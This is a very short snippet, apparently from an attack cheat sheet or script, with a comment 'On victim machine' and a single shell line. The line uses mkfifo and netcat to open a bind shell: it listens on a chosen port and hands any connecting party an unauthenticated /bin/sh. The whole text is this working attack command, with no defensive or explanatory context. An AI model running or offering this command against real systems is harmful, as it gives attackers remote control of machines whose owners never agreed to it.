# On victim machine
mkfifo /tmp/f; nc -l -p $1 < /tmp/f | /bin/sh > /tmp/f 2>&1
